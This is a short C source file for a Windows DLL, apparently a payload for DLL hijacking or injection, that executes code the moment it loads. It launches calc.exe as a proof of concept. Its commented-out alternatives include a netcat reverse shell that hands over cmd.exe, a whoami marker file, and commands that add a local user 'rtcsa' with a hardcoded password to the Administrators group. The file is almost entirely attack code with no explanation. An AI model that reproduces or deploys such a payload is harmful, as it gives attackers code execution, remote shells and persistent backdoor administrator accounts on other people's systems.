#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            //system("whoami > C:\\Temp\\houndwashere.txt");
            //system("C:\\Temp\\nc64.exe 127.0.0.1 4444 -e cmd.exe");
			//system("net user rtcsa P@ssw0rd1! /add");
			//system("net localgroup Administradores rtcsa /add");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
		//system("C:\\Temp\\nc64.exe 127.0.0.1 4444 -e cmd.exe");
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}